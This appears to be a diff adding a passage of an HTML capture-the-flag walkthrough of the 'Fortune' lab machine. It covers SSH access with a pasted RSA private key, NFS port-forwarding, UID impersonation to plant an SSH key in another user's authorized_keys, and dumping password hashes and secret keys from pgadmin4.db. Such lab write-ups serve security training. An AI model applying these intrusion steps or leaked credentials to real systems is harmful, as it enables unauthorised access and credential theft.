+                &gt;&nbsp;MIIEpAIBAAKCAQEAu/ZiZyzTx9pz7H69CsBKZ9BkT2fZMKF1J8aOuqPG/1HS5p4V<br>
+                &gt;&nbsp;sXsx6GOnlRguVjb/qnsLbCxcHbB6E2sPGCYHi6sM+opt7+NJmMyG8n86qvv9Y/R0<br>
+                &gt;&nbsp;TRkDOFf2tH1Ni61yH1kBSgkbEvLXPhpa4JsaUmOlKOMEqVLBh2Q9tKgi6ViRDAGR<br>
+                &gt;&nbsp;cRd3wO7obsVHFfJ5hRIxYg0W4k5rusbpzBl3bbpMJu7v8MFtw9zLSkOoyKo+aJAx<br>
+                &gt;&nbsp;oYY9l8IlLt3TfrPADQZ/sKH6nrVrnVEYKjPIYp7ln+UdWUch1J5+2tvz5SazQWt0<br>
+                &gt;&nbsp;eTymQc9LPFQtdzsE/zNiX0BdJeJwcdo6hviGwwIDAQABAoIBADM4Yfphsdh9RCfH<br>
+                &gt;&nbsp;Jba/Tcdad2tYDkx9QxKyvgRISxsabhFgNOMngiMkvO8ZJs9hr2wCmctBj1yb0bhm<br>
+                &gt;&nbsp;7TcUbev2kdPYUzsSweR8n62HVDJx9sv9OpAj58e72MO4faA5hKbcN0i4kIMqX9NR<br>
+                &gt;&nbsp;lUAtpA+djc1Fh+ioX4qIm3QWeWUCwP1u4dppCM8i4irDOfrVh1uur+85ybqDhFFX<br>
+                &gt;&nbsp;vgvPv6aE9QMwWnhNaexu2BdoFTUGHHq7mZMj/p4o+/TJmH36S26gJwTJOhlwFEIy<br>
+                &gt;&nbsp;HpshBP9SdtrIPaoiW6e1GAe1pOcaQ9L+m/zy0QSQuzZW7lej8Pp/sFOk2G+05Bhf<br>
+                &gt;&nbsp;7l2HfvECgYEA3PVvSXmCCTjeWF+mPGjMY/p1NGaednMCycmAEYyAHb85gKR47gS8<br>
+                &gt;&nbsp;yelLfEptZOYVbg7udNm+zKCBByhX4ATw9LgbUwKL42+JE5zBYy0oOG4c3H86a08R<br>
+                &gt;&nbsp;MeZt3HsFNpxfU6P/41EXA9g0EyrNb50XQFloe9JPspz3wGQ26GXtiYkCgYEA2cVa<br>
+                &gt;&nbsp;mg6BlvPOqaMMOWRDy/zx00jI/fo41AAntGAkLGUlC+XsQfzgjo4NpycrGjLkm1uQ<br>
+                &gt;&nbsp;2NKJP08SwgBO+Wbiqxg0IMEtJGB3j7AU/fnpSWVQXTIq9/VPhwA59JmVOM7yiScR<br>
+                &gt;&nbsp;eZGNLE4WcQ+7gvGD5p02ArLhjnITwkhwEHhtlusCgYEAkiX02hB4pkjrKGD7v3FB<br>
+                &gt;&nbsp;389FvscxgP9JlNam0vSvuP1Gt4QSSLzxckvRFgDUoqxc+FL//mIYBZkUPvu8Q/yA<br>
+                &gt;&nbsp;tB0iVaGVjXW0oThJ4aN4uvp6NI4iwd+ma+8SM4dbR2fe1Z/gHScBphVXPGZPQ8gQ<br>
+                &gt;&nbsp;HQwGRAAzntycMrEWcFka6KECgYB8tDfqym3JHHp2x+ijINh2ArYUULTQQ66xMBmM<br>
+                &gt;&nbsp;gBWW2qC5TIPbUczhtVT6KELVcNlaYbfzgbSYbVaHg5e12AXrBiQrsZOBJkCxJpsO<br>
+                &gt;&nbsp;yUKfBgZcJ/NVJMPSwf1uJVi/PDrE8XtfS0s1WM4fFmxBUr4+nD4mk3r4kDjiY4rQ<br>
+                &gt;&nbsp;07Wl2wKBgQCQOnb8EBmWORvdg+F2+YnsRbKmc4wsXYuMxLTW9nVTPRprNb8rP4b1<br>
+                &gt;&nbsp;3ZzY7G4OHmtwzgI1ddUaK3PVeFQPRI6Qvm4JekNjQa/pskHRqPAcR+h2pch1NfGb<br>
+                &gt;&nbsp;JXHSvu0/oG9q9PcZYEkbvVpo7ikcPsd568nQy6ccUeQxmCG8oIAKtw==<br>
+                &gt;&nbsp;-----END&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----"&nbsp;&gt;&nbsp;~/.ssh/fortune_rsa.privkey
+            </div>
+        </div><br>
+        <br>
+        Change the permissions of the private key to <code>600</code> (read/write for owner), otherwise <code>ssh</code> won't accept it.<br>
+            <div class="codebox">
+                root@gotham:~/.ssh#&nbsp;chmod&nbsp;600&nbsp;fortune_rsa.privkey&nbsp;<br>
+                root@gotham:~/.ssh#&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;28K<br>
+                drwx------&nbsp;&nbsp;2&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jul&nbsp;&nbsp;4&nbsp;16:54&nbsp;.<br>
+                drwxr-xr-x&nbsp;29&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jul&nbsp;&nbsp;4&nbsp;15:11&nbsp;..<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;1.7K&nbsp;Jul&nbsp;&nbsp;4&nbsp;16:53&nbsp;fortune_rsa.privkey<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;381&nbsp;Jul&nbsp;&nbsp;4&nbsp;16:54&nbsp;fortune_rsa.pubkey<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;3.4K&nbsp;Jun&nbsp;27&nbsp;14:17&nbsp;id_rsa<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;737&nbsp;Jun&nbsp;27&nbsp;14:17&nbsp;id_rsa.pub<br>
+                -rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;2.2K&nbsp;Jun&nbsp;28&nbsp;09:40&nbsp;known_hosts
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) ssh</strong></h2><br>
+        The 3 users we found from the system's home folder were:<br>
+        • charlie<br>
+        • bob<br>
+        • nfsuser<br>
+        <br>
+        The only user you can ssh in as is <code>nfsuser</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;ssh&nbsp;nfsuser@10.10.10.127&nbsp;-i&nbsp;~/.ssh/fortune_rsa.privkey<br>
+                <br>
+                Hello&nbsp;nfsuser.&nbsp;You&nbsp;are&nbsp;authenticated&nbsp;from&nbsp;host&nbsp;"10.10.14.24"
+            </div>
+        </div><br>
+        <br>
+        But we're dropped into an <code>authpf</code> shell, as described on the 443/https page, and can't do anything.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>6a) Mount nfs</strong></h3><br>
+        The name of the user is a hint towards what to do next - <code>nfsuser</code>.<br>
+        We know from nmap that there's n outside-looking <code>nfs</code> service running. Running <code>showmount</code> demonstrates this.<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;showmount&nbsp;-e&nbsp;10.10.10.127<br>
+                clnt_create:&nbsp;RPC:&nbsp;Unable&nbsp;to&nbsp;receive
+            </div>
+        </div><br>
+        <br>
+        However, we now have ssh access to the system.<br>
+        We can port forward the internally running nfs service to a port on our attacking machine and mount the nfs via the port forward.<br>
+        <br>
+        Connect to the system using <code>ssh</code> and port forward local port <code>2049</code>, which is where the nfs service runs, to your attacking machine port <code>3049</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;ssh&nbsp;-i&nbsp;~/.ssh/fortune_rsa.privkey&nbsp;nfsuser@10.10.10.127&nbsp;-L&nbsp;2049:127.0.0.1:3049<br>
+                Last&nbsp;login:&nbsp;Fri&nbsp;Jul&nbsp;&nbsp;5&nbsp;05:28:24&nbsp;2019&nbsp;from&nbsp;10.10.14.24<br>
+                <br>
+                Hello&nbsp;nfsuser.&nbsp;You&nbsp;are&nbsp;authenticated&nbsp;from&nbsp;host&nbsp;"10.10.14.24"
+            </div>
+        </div><br>
+        <br>
+        Using <code>showmount</code>, we now see that fortune's <code>/home</code> directory is available to mount.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;showmount&nbsp;-e&nbsp;10.10.10.127<br>
+                Export&nbsp;list&nbsp;for&nbsp;10.10.10.127:<br>
+                /home&nbsp;(everyone)
+            </div>
+        </div><br>
+        <br>
+        Make a directory in <code>tmp</code> to mount the share to and mount <code>/home</code> using <code>mount</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;mkdir&nbsp;/tmp/fortune-nfs<br>
+                root@gotham:~/ctf/fortune#&nbsp;mount&nbsp;-t&nbsp;nfs&nbsp;10.10.10.127:/home&nbsp;/tmp/fortune-nfs
+            </div>
+        </div><br>
+        <br>
+        Go browse the nfs :)<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>6b) Browse nfs</strong></h3><br>
+        Neither <code>bob</code> or <code>nfsuser</code>'s home directories contain anything interesting and we don't have permissions to access <code>charlie</code>.<br>
+            <div class="codebox">
+                root@gotham:/tmp/fortune-nfs#&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;12K<br>
+                drwxr-xr-x&nbsp;&nbsp;5&nbsp;root&nbsp;root&nbsp;&nbsp;512&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxrwxrwt&nbsp;23&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jul&nbsp;&nbsp;5&nbsp;10:34&nbsp;..<br>
+                drwxr-xr-x&nbsp;&nbsp;5&nbsp;1001&nbsp;1001&nbsp;&nbsp;512&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;bob<br>
+                drwxr-x---&nbsp;&nbsp;3&nbsp;1000&nbsp;1000&nbsp;&nbsp;512&nbsp;Nov&nbsp;&nbsp;6&nbsp;&nbsp;2018&nbsp;charlie<br>
+                drwxr-xr-x&nbsp;&nbsp;2&nbsp;1002&nbsp;1002&nbsp;&nbsp;512&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;nfsuser<br>
+                root@gotham:/tmp/fortune-nfs#&nbsp;cd&nbsp;charlie<br>
+                bash:&nbsp;cd:&nbsp;charlie:&nbsp;Permission&nbsp;denied
+            </div>
+        </div><br>
+        <br>
+        However, you can get around the access permissions for <code>charlie</code> by creating a copy of the user <code>charlie</code> on your local, attacking machine. If the user ID and group ID of your copy of <code>charlie</code> match that of charlie on the target system (1000 and 1000), you can access <code>charlie</code>'s files.<br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>6c) Impersonate charlie</strong></h3><br>
+        Get <code>charlie</code>'s user ID and group ID by reading <code>/etc/password</code> from the remote code execution vuln on port 80 from earlier.<br>
+        (or you could look at the file ownerships above but reading <code>/etc/passwd</code> is good way to double-check)<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        Charlie's UID and GID are both <code>1000</code> - <code>charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh</code>.<br>
+        <br>
+        On your attacking machine, create a new user called <code>charlie</code> and set their UID and GID to 1000 (if you haven't added any other users on your system the UID might already be 1000, that was the case for me)<br>
+            <div class="codebox">
+                root@gotham:/tmp/fortune-nfs#&nbsp;useradd&nbsp;charlie<br>
+                root@gotham:/tmp/fortune-nfs#&nbsp;usermod&nbsp;-u&nbsp;1000&nbsp;charlie<br>
+                root@gotham:/tmp/fortune-nfs#&nbsp;usermod&nbsp;-g&nbsp;1000&nbsp;charlie<br>
+                root@gotham:/tmp/fortune-nfs#&nbsp;usermod&nbsp;-s&nbsp;/bin/bash&nbsp;charlie<br>
+                root@gotham:/tmp/fortune-nfs#&nbsp;cat&nbsp;/etc/passwd<br>
+                ...<br>
+                charlie:x:1000:1000::/home/charlie:/bin/bash
+            </div>
+        </div><br>
+        <br>
+        <code>su</code> from <code>root</code> to <code>charlie</code> and browse the nfs again.<br>
+        Now we can access <code>charlie</code>'s files.<br>
+            <div class="codebox">
+                root@gotham:/tmp/fortune-nfs#&nbsp;su&nbsp;charlie<br>
+                charlie@gotham:/tmp/fortune-nfs$&nbsp;cd&nbsp;charlie/<br>
+                charlie@gotham:/tmp/fortune-nfs/charlie$&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;22K<br>
+                drwxr-x---&nbsp;3&nbsp;charlie&nbsp;charlie&nbsp;512&nbsp;Nov&nbsp;&nbsp;6&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr-x&nbsp;5&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;512&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw-r-----&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;771&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.cshrc<br>
+                -rw-r-----&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;101&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.cvsrc<br>
+                -rw-r-----&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;359&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.login<br>
+                -rw-r-----&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;175&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.mailrc<br>
+                -rw-------&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;608&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;mbox<br>
+                -rw-r-----&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;216&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.profile<br>
+                drwx------&nbsp;2&nbsp;charlie&nbsp;charlie&nbsp;512&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;.ssh<br>
+                -r--------&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;&nbsp;33&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;user.txt<br>
+                -rw-r-----&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;&nbsp;87&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;.Xdefaults
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>6d) Get ssh access as charlie</strong></h3><br>
+        You can get a shell as charlie by adding your ssh public key to <code>charlie</code>'s authorized_keys file.<br>
+        <br>
+        Get/read your public key from <code>~/.ssh</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;cat&nbsp;~/.ssh/id_rsa.pub<br>
+                ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAA...
+            </div>
+        </div><br>
+        <br>
+        Add your public key into <code>charlie</code>'s <code>authorized_keys</code> file on the nfs.<br>
+        Make sure to use <code>&gt;&gt;</code> and append your key, to avoid overwriting other players' ssh access.<br>
+            <div class="codebox">
+                charlie@gotham:/tmp/fortune-nfs/charlie$&nbsp;cd&nbsp;.ssh<br>
+                charlie@gotham:/tmp/fortune-nfs/charlie/.ssh$&nbsp;ls&nbsp;-alh<br>
+                total&nbsp;4.0K<br>
+                drwx------&nbsp;2&nbsp;charlie&nbsp;charlie&nbsp;512&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-x---&nbsp;3&nbsp;charlie&nbsp;charlie&nbsp;512&nbsp;Nov&nbsp;&nbsp;6&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw-------&nbsp;1&nbsp;charlie&nbsp;charlie&nbsp;&nbsp;&nbsp;0&nbsp;Oct&nbsp;11&nbsp;&nbsp;2018&nbsp;authorized_keys<br>
+                charlie@gotham:/tmp/fortune-nfs/charlie/.ssh$&nbsp;echo&nbsp;"ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAA..."&nbsp;&gt;&gt;&nbsp;authorized_keys
+            </div>
+        </div><br>
+        <br>
+        <code>ssh</code> in as <code>charlie</code> using your private key as authentication.<br>
+        We now have stable shell access to the system. Go grab <code>user.txt</code>!<br>
+            <div class="codebox">
+                root@gotham:~/ctf/fortune#&nbsp;ssh&nbsp;charlie@10.10.10.127&nbsp;-i&nbsp;~/.ssh/id_rsa<br>
+                OpenBSD&nbsp;6.4&nbsp;(GENERIC)&nbsp;#349:&nbsp;Thu&nbsp;Oct&nbsp;11&nbsp;13:25:13&nbsp;MDT&nbsp;2018<br>
+                <br>
+                Welcome&nbsp;to&nbsp;OpenBSD:&nbsp;The&nbsp;proactively&nbsp;secure&nbsp;Unix-like&nbsp;operating&nbsp;system.<br>
+                fortune$&nbsp;whoami<br>
+                charlie<br>
+                fortune$&nbsp;pwd<br>
+                /home/charlie<br>
+                fortune$&nbsp;cat&nbsp;user.txt<br>
+                ada0af...
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) root</strong></h2><br>
+        If you read <code>charlie</code>'s mailbox in his home directory, you'll find an email from bob.<br>
+            <div class="codebox">
+                fortune$&nbsp;ls&nbsp;-l&nbsp;<br>
+                total&nbsp;8<br>
+                -rw-------&nbsp;&nbsp;1&nbsp;charlie&nbsp;&nbsp;charlie&nbsp;&nbsp;608&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;mbox<br>
+                -r--------&nbsp;&nbsp;1&nbsp;charlie&nbsp;&nbsp;charlie&nbsp;&nbsp;&nbsp;33&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;user.txt<br>
+                fortune$&nbsp;cat&nbsp;mbox<br>
+                From&nbsp;bob@fortune.htb&nbsp;Sat&nbsp;Nov&nbsp;&nbsp;3&nbsp;11:18:51&nbsp;2018<br>
+                Return-Path:&nbsp;&lt;bob@fortune.htb&gt;<br>
+                Delivered-To:&nbsp;charlie@fortune.htb<br>
+                Received:&nbsp;from&nbsp;localhost&nbsp;(fortune.htb&nbsp;[local])<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by&nbsp;fortune.htb&nbsp;(OpenSMTPD)&nbsp;with&nbsp;ESMTPA&nbsp;id&nbsp;bf12aa53<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;&lt;charlie@fortune.htb&gt;;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sat,&nbsp;3&nbsp;Nov&nbsp;2018&nbsp;11:18:51&nbsp;-0400&nbsp;(EDT)<br>
+                From:&nbsp;&nbsp;&lt;bob@fortune.htb&gt;<br>
+                Date:&nbsp;Sat,&nbsp;3&nbsp;Nov&nbsp;2018&nbsp;11:18:51&nbsp;-0400&nbsp;(EDT)<br>
+                To:&nbsp;charlie@fortune.htb<br>
+                Subject:&nbsp;pgadmin4<br>
+                Message-ID:&nbsp;&lt;196699abe1fed384@fortune.htb&gt;<br>
+                Status:&nbsp;RO<br>
+                <br>
+                Hi&nbsp;Charlie,<br>
+                <br>
+                Thanks&nbsp;for&nbsp;setting-up&nbsp;pgadmin4&nbsp;for&nbsp;me.&nbsp;Seems&nbsp;to&nbsp;work&nbsp;great&nbsp;so&nbsp;far.<br>
+                BTW:&nbsp;I&nbsp;set&nbsp;the&nbsp;dba&nbsp;password&nbsp;to&nbsp;the&nbsp;same&nbsp;as&nbsp;root.&nbsp;I&nbsp;hope&nbsp;you&nbsp;don't&nbsp;mind.<br>
+                <br>
+                Cheers,<br>
+                <br>
+                Bob
+            </div>
+        </div><br>
+        <br>
+        <code>charlie</code> has set up <code>pgadmin4</code> for <code>bob</code>, and Bob has changed the dba (database administrator password) to be the same as <code>root</code>.<br>
+        <br>
+        Our goal, then, is to find the database administrator password.<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) pgadmin4.db</strong></h2><br>
+        pgAdmin is a GUI administration frontend for postgresql databases - <a href="https://www.pgadmin.org/">https://www.pgadmin.org/</a><br>
+        <br>
+        Search for the pgadmin4 directory using <code>find</code>.<br>
+            <div class="codebox">
+                fortune$&nbsp;find&nbsp;/&nbsp;-name&nbsp;pgadmin4&nbsp;2&gt;/dev/null<br>
+                /usr/local/pgadmin4<br>
+                /usr/local/pgadmin4/.virtualenvs/pgadmin4<br>
+                /var/log/pgadmin4<br>
+                /var/www/htdocs/pgadmin4<br>
+                /var/www/run/pgadmin4<br>
+                /var/appsrv/pgadmin4<br>
+                fortune$&nbsp;ls&nbsp;-l&nbsp;/usr/local/pgadmin4<br>
+                total&nbsp;60100<br>
+                drwxr-xr-x&nbsp;&nbsp;7&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512&nbsp;Oct&nbsp;&nbsp;1&nbsp;&nbsp;2018&nbsp;pgadmin4-3.4<br>
+                -rw-r-----&nbsp;&nbsp;1&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;30743447&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;pgadmin4-3.4.tar.gz
+            </div>
+        </div><br>
+        <br>
+        Inside <code>/usr/local/pgadmin4</code>, you'll find the source code of the installed version of pgadmin4 - <code>pgadmin4-3.4.tar.gz</code><br>
+            <div class="codebox">
+                fortune$&nbsp;ls&nbsp;-l&nbsp;/usr/local/pgadmin4<br>
+                total&nbsp;60100<br>
+                drwxr-xr-x&nbsp;&nbsp;7&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;512&nbsp;Oct&nbsp;&nbsp;1&nbsp;&nbsp;2018&nbsp;pgadmin4-3.4<br>
+                -rw-r-----&nbsp;&nbsp;1&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;30743447&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;pgadmin4-3.4.tar.gz
+            </div>
+        </div><br>
+        <br>
+        And in <code>/var/appsrv/pgadmin4/</code> you'll find <code>pgadmin4.db</code>, which contains entries from the pgadmin4 database.<br>
+            <div class="codebox">
+                fortune$&nbsp;ls&nbsp;-alh&nbsp;/var/appsrv/pgadmin4/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                total&nbsp;252<br>
+                drwxr-x---&nbsp;&nbsp;4&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;.<br>
+                drwxr-xr-x&nbsp;&nbsp;5&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;2&nbsp;&nbsp;2018&nbsp;..<br>
+                -rw-r-----&nbsp;&nbsp;1&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;116K&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;pgadmin4.db<br>
+                -rw-r-----&nbsp;&nbsp;1&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;479B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;pgadmin4.ini<br>
+                drwxr-x---&nbsp;&nbsp;2&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;sessions<br>
+                drwxr-x---&nbsp;&nbsp;3&nbsp;_pgadmin4&nbsp;&nbsp;wheel&nbsp;&nbsp;&nbsp;512B&nbsp;Nov&nbsp;&nbsp;3&nbsp;&nbsp;2018&nbsp;storage
+            </div>
+        </div><br>
+        <br>
+        If you read the <code>pgadmin4.db</code> file using <code>strings</code> (to get rid of any non-ascii garbage), you'll find 3 interesting results:<br>
+            <div class="codebox">
+                fortune$&nbsp;strings&nbsp;/var/appsrv/pgadmin4/pgadmin4.db&nbsp;<br>
+                ...<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ConfigDB<br>
+                bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg<br>
+                charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ<br>
+                bob@fortune.htb<br>
+                3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;charlie@fortune.htb<br>
+                /UserpgAdmin&nbsp;User&nbsp;Role+<br>
+                'AAdministratorpgAdmin&nbsp;Administrator&nbsp;Role<br>
+                User<br>
+                '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Administrator<br>
+                <br>
+                ...<br>
+                <br>
+                9eSECURITY_PASSWORD_SALTqIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=9<br>
+                !eSECRET_KEYR_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=?<br>
+                -eCSRF_SESSION_KEYsaQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=<br>
+                <br>
+                ...<br>
+                <br>
+                fortunelocalhost<br>
+                8postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz<br>
+                <br>
+                prefer&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt<br>
+                &lt;STORAGE_DIR&gt;/.postgresql/postgresql.key22<br>
+                SECURITY_PASSWORD_SALT<br>
+                SECRET_KEY<br>
+                -&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CSRF_SESSION_KEY
+            </div>
+        </div><br>
+        <br>
+        <strong>a)</strong> <strong><code>bob</code></strong> <strong>and</strong> <strong><code>charlie</code></strong><strong>'s password hashes</strong><br>
+        <code>bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg</code><br>
+        <br>
+        <code>charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ</code><br>
+        <br>
+        <strong>b) A set of security/secret keys</strong><br>
+        <code>SECURITY_PASSWORD_SALT - qIhAhRt3xq_dzIEqyJQFmWnymFbO1cZVhbQaTWA-v9Q=<br>
+        SECRET_KEY - R_EFY1hb236guS3jNq1aHyPcruXbjk7Ff-QwL6PMqJM=<br>
+        CSRF_SESSION_KEY - saQWKx5BCyVZMH2weOiNv3Dsvzh4GchPM16kwBRYPxs=</code><br>
+        <br>
+        <strong>c) The</strong> <strong><code>dba</code></strong> <strong>user and their password hash</strong><br>
+        <code>fortune - localhost - postgres - dba<br>
+        utUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGz</code><br>
+        <br>
+        At this point, we've now found the <code>dba</code> user's password in hash/encrypted format.<br>
+        All that we need to do know is decrypt the hash and we'll have <code>root</code>'s password.<br>
+        <br>
+        If you wanted to make retrieving this info as easy possible for yourself (as you should), you can browse the entire database file using a database browser - e.g. <a href="https://sqlitebrowser.org/">https://sqlitebrowser.org/</a> - and navigate the <code>pgadmin4.db</code> file with a GUI. This is what I ended up doing after struggling with root for so long.<br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>9) Read source code</strong></h2><br>
+        The answer to decrypting to <code>dba</code>'s password can be found in the source code, which has been kindly provided to us in <code>/usr/local/pgadmin4/pgadmin4-3.4.tar.gz</code>. You could <code>scp</code> this to your machine or just google for the version number + source code and download it here - <a href="https://www.postgresql.org/ftp/pgadmin/pgadmin4/v3.4/source/">https://www.postgresql.org/ftp/pgadmin/pgadmin4/v3.4/source/</a><br>
+        <br>
+        You can read through the source code yourself, or grep through it. But make things easy for yourself.<br>
+        I'm using Notepadqq on ubuntu - <code>sudo snap install --classic notepadqq</code> - and searching the entire directory for words and reading the source code with syntax highlighting.<br>
+        <br>
+        We're interested in learning how <code>dba</code>'s password is encrypted, so search the entire pgadmin4-3.4 directory of source code for an <code>encrypt()</code> function.<br>
+        <br>
+        Search &gt; Advanced Search &gt; Search: encrypt( &gt; Scope: Search in Files on File System &gt; Location: pgadmin4-3.4<br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        Results:<br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        There's an <code>encrypt()</code> function in 2 different files<br>
+        • <code>/web/pgadmin/utils/crypto.py</code> - where the <code>encrypt()</code> function gets defined<br>
+        • and <code>/web/pgadmin/browser/server_groups/servers/__init__.py</code> - where the <code>encrypt()</code> function gets called<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
